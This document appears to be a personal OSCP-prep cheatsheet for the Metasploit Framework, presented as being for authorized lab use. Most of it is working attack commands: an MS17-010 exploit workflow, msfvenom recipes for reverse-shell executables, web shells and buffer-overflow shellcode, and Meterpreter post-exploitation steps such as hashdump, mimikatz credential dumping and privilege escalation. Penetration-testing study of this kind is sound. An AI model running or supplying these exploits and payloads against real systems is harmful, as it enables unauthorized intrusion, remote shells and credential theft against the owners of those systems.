# Notes — Metasploit Framework

> Authorized lab/OSCP use only.
> **OSCP rule:** Metasploit (and the Meterpreter payload) may be used on **only one** exam machine, and `msfvenom`/`multi-handler` restrictions apply. Learn the manual equivalents — this note covers both the framework and the standalone `msfvenom` payloads you're allowed to use freely.

---

## Setup
```bash
sudo msfdb init          # initialize the database
msfconsole              # start the console
db_status               # confirm DB connection
workspace -a lame       # per-target workspace
```

## Core Console Workflow
```bash
search ms17-010                 # find modules by CVE/keyword
search type:exploit platform:windows smb
use exploit/windows/smb/ms17_010_psexec
info                            # module details
show options                    # required settings (RHOSTS, LHOST, etc.)
set RHOSTS 10.10.10.4
set LHOST tun0                  # can use interface name
set LPORT 4444
show payloads                   # compatible payloads
set PAYLOAD windows/x64/meterpreter/reverse_tcp
check                           # safe vuln check (where supported)
exploit                         # or: run
exploit -j                      # run as background job
```

## Sessions
```bash
sessions                        # list sessions
sessions -i 1                   # interact with session 1
background                      # (Ctrl+Z) drop session to background
sessions -u 1                   # upgrade shell to meterpreter
sessions -k 1                   # kill session 1
```

## Multi/Handler (catch a shell from a standalone payload)
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
exploit -j
```

## Meterpreter Cheatsheet
| Command | Purpose |
|---------|---------|
| `getuid` | Current user context |
| `sysinfo` | OS/arch info |
| `getprivs` | Enabled privileges |
| `ps` / `migrate <pid>` | List / migrate to a process |
| `shell` | Drop to a system shell |
| `upload <l> <r>` / `download <r> <l>` | File transfer |
| `hashdump` | Dump local SAM hashes |
| `getsystem` | Attempt local privesc to SYSTEM |
| `load kiwi` → `creds_all` | Mimikatz in-memory |
| `portfwd add -l 3389 -p 3389 -r <ip>` | Port forwarding |
| `run post/multi/recon/local_exploit_suggester` | Suggest privesc modules |
| `background` / `sessions` | Session management |

---

## msfvenom (payload generation — allowed on OSCP)

```bash
# list payloads / formats / encoders
msfvenom -l payloads
msfvenom --list formats

# Windows reverse shell (non-meterpreter — exam-safe)
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f elf -o shell.elf

# Meterpreter (counts toward the one-box MSF limit)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f exe -o met.exe

# Web payloads
msfvenom -p php/reverse_php LHOST=tun0 LPORT=443 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=443 -f raw -o shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=443 -f war -o shell.war   # Tomcat
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -f asp -o shell.asp

# Shellcode for buffer-overflow exploits (-b = bad chars)
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -f c -b "\x00\x0a\x0d" EXITFUNC=thread
```

| Flag | Meaning |
|------|---------|
| `-p` | Payload |
| `-f` | Output format (exe, elf, raw, c, war, asp, psh) |
| `-o` | Output file |
| `-b` | Bad characters to avoid |
| `-e` | Encoder (e.g. `x86/shikata_ga_nai`) |
| `-i` | Encoding iterations |
| `LHOST/LPORT` | Callback address/port |

---

## Useful Auxiliary / Post Modules
```bash
auxiliary/scanner/smb/smb_version
auxiliary/scanner/smb/smb_ms17_010
auxiliary/scanner/ssh/ssh_login
post/multi/recon/local_exploit_suggester
post/windows/gather/hashdump
```

## searchsploit ↔ Metasploit
```bash
searchsploit ms08-067           # confirm public exploit exists
searchsploit -m <path>          # copy exploit locally (manual route)
```

---

## Common Mistakes
- Forgetting to set `LHOST` to the VPN interface (`tun0`), so the shell never calls back.
- Using Meterpreter on more than one exam box (disqualifying).
- `exploit` with no listener/handler for a staged payload mismatch (stage vs stageless).
- Wrong architecture payload (`x86` vs `x64`).

## OSCP Tips
- Budget your single MSF/Meterpreter box deliberately — don't waste it early.
- `msfvenom` payloads + `nc`/`multi-handler` are fine everywhere; master them.
- `local_exploit_suggester` is a great hint generator — then verify/exploit manually.
- Always prefer a non-staged, non-meterpreter payload (`shell_reverse_tcp`) when you want to stay within exam limits.
